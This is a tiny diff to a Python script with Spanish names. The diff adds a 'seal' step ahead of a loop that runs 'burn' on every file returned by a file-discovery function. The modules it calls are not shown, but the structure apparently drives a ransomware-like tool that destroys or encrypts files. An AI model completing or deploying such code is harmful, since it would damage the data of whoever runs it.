@@ -1,7 +1,9 @@
 import discover
 import burn
+import seal
 
 archivos=discover.encuentra_archivos()
+seal.main()
 
 for item in archivos:
     burn.main(item)
